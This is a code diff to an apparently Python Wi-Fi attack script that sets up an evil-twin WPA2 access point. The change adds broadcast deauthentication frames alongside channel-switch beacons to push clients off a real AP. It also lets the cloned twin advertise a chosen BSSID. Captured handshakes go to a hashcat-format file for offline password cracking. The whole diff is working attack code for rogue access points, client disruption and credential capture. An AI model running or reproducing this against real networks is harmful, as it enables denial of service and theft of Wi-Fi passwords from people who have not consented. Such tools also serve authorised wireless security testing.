@@ -30,6 +30,7 @@ sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent / "src"))
 
 from wifit3.device.manager import wlan_ifaces
 from wifit3.chips.driver import FakeMacSupport
+from wifit3.dot11 import build_deauth
 from wifit3.dot11.ap import beacon_clone, auth_resp, assoc_resp, eapol_m1
 from wifit3.dot11.probe import probe_resp
 from wifit3.dot11.csa import build_csa_beacon
@@ -184,13 +185,14 @@ async def _beacon_loop(iface, twin: bytes) -> None:
         await asyncio.sleep(_BEACON_PERIOD_S)
 
 
-async def _csa_punt_loop(iface, target_channel: int, csa_beacon: bytes) -> None:
+async def _punt_loop(iface, target_channel: int, frames: list[bytes]) -> None:
     if iface.current_channel != target_channel:
         await iface.set_channel(target_channel)
-    print(f"[*] punting: CSA beacons on ch {target_channel} -> ch (decoy) in bursts")
+    print(f"[*] punting on ch {target_channel}: {len(frames)} frame type(s) in bursts")
     while True:
         for _ in range(_CSA_BURST):
-            await iface.send_no_wait(csa_beacon)
+            for frame in frames:
+                await iface.send_no_wait(frame)
             await asyncio.sleep(_CSA_INTRA_S)
         await asyncio.sleep(_CSA_INTER_S)
 
@@ -235,37 +237,44 @@ async def main(a) -> None:
             print("[-] txcard connect failed")
             return
 
-    bssid = _mac_bytes(a.bssid)
+    bssid = _mac_bytes(a.bssid)                                        # the real AP: captured + punted
+    twin_bssid = _mac_bytes(a.twin_bssid) if a.twin_bssid else bssid   # advertised twin (== real for exact clone)
     cap_iface = txcard or apcard
     print(f"[*] capturing {a.bssid} beacon on ch {a.target_channel}...")
     real = await capture_beacon(cap_iface, a.bssid, a.target_channel, timeout=a.capture_timeout)
     if real is None:
         print(f"[-] no beacon from {a.bssid} in {a.capture_timeout}s; synthesizing a twin beacon")
         ssid = a.ssid or "FakeAP-Test"
-        twin = _synth_beacon(bssid, ssid, a.channel)
+        twin = _synth_beacon(twin_bssid, ssid, a.channel)
         beacon_frame = twin
     else:
         ssid = a.ssid or _ssid_of(real) or "FakeAP-Test"
         twin = beacon_clone(real, a.channel)
+        twin = twin[:10] + twin_bssid + twin_bssid + twin[22:]         # advertise twin_bssid (exact clone: no-op)
         beacon_frame = real
-        print(f"[+] cloned real beacon ({len(real)} B) -> WPA2-only twin ({len(twin)} B), ssid '{ssid}'")
+        print(f"[+] cloned real beacon ({len(real)} B) -> WPA2-only twin ({len(twin)} B) "
+              f"bssid {_mac_str(twin_bssid)}, ssid '{ssid}'")
 
     await apcard.set_channel(a.channel)
-    armed = await apcard.set_fake_mac(bssid, bssid)
-    if not armed or _mac_bytes(armed) != bssid:
-        print(f"[-] active monitor did not arm on the exact BSSID (got {armed}); aborting.")
+    armed = await apcard.set_fake_mac(twin_bssid, twin_bssid)
+    if not armed or _mac_bytes(armed) != twin_bssid:
+        print(f"[-] active monitor did not arm on the twin BSSID (got {armed}); aborting.")
         return
     print(f"[+] armed: hardware ACKs frames to {armed} on ch {a.channel}")
 
-    responder = ApResponder(apcard, bssid, ssid, a.channel, beacon_frame, Path(a.out))
+    responder = ApResponder(apcard, twin_bssid, ssid, a.channel, beacon_frame, Path(a.out))
     apcard.register_rx_callback(responder.on_rx)
     print(f"[*] beaconing '{ssid}' (WPA2-PSK) on ch {a.channel} as {armed}")
     print(f"[*] writing captures to {a.out}. Ctrl-C to stop.\n")
 
     tasks = [asyncio.create_task(_beacon_loop(apcard, twin))]
     if txcard is not None:
-        csa = build_csa_beacon(real if real is not None else twin, a.channel)
-        tasks.append(asyncio.create_task(_csa_punt_loop(txcard, a.target_channel, csa)))
+        punt_frames = []
+        if a.punt in ("csa", "both"):
+            punt_frames.append(build_csa_beacon(real if real is not None else twin, a.channel))
+        if a.punt in ("deauth", "both"):
+            punt_frames.append(build_deauth(_BCAST, bssid, bssid, 7))   # real AP -> broadcast
+        tasks.append(asyncio.create_task(_punt_loop(txcard, a.target_channel, punt_frames)))
 
     try:
         await asyncio.gather(*tasks)
@@ -306,10 +315,13 @@ if __name__ == "__main__":
     p = argparse.ArgumentParser(description="WPA2-PSK FakeAP reference + M2 capture")
     p.add_argument("--apcard", required=True, help="substring of the FakeAP card (SPOOFABLE)")
     p.add_argument("--txcard", default="", help="substring of the punt card (CSA on target channel)")
-    p.add_argument("--bssid", required=True, help="exact BSSID of the target to clone")
+    p.add_argument("--bssid", required=True, help="BSSID of the real target (captured + punted)")
+    p.add_argument("--twin-bssid", default="", help="BSSID to advertise for the twin (default: exact clone of --bssid)")
     p.add_argument("--ssid", default="", help="override SSID (default: read from the cloned beacon)")
     p.add_argument("--channel", type=int, default=1, help="decoy channel for the twin")
     p.add_argument("--target-channel", type=int, default=11, help="the target AP's real channel")
+    p.add_argument("--punt", choices=("csa", "deauth", "both"), default="csa",
+                   help="how to punt clients off the real AP on the target channel")
     p.add_argument("--capture-timeout", type=float, default=10.0)
     p.add_argument("--out", default=str(Path(tempfile.gettempdir()) / "eviltwin.hc22000"))
     p.add_argument("--debug", action="store_true")
